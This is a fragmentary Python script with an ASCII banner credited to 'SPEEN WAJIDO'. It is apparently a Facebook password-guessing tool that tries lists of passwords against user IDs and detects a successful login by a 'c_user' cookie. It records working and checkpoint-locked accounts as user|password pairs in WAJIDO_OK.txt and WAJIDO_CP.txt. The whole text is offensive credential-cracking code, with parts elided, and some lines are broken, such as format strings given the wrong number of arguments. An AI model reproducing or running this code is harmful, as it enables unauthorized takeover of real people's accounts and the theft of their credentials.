...
\033[1;34mdb   d8b   db  .d8b.     d88b d888888b d8888b.  .d88b.  
88   I8I   88 d8' `8b    `8P'   `88'   88  `8D .8P  Y8. 
88   I8I   88 88ooo88     88     88    88   88 88    88 
Y8   I8I   88 88~~~88     88     88    88   88 88    88 
`8b d8'8b d8' 88   88 db. 88    .88.   88  .8D `8b  d8' 
 `8b8' `8d8'  YP   YP Y8888P  Y888888P Y8888D'  `Y88P' 
...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : SPEEN WAJIDO
 
\033[0;93mFACEBOOK : ITX WAJIDO
 
\033[0;96mGITHUB   : SPEEN WAJIDO
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mWAJIDO_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91WAJIDO_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r\x1b[1;92m[WAJIDO] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[WAJIDO-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('WAJIDO_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[WAJIDO-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('WAJIDO_CP.txt' , 'a').write('%s\n' % wrt)
                        break
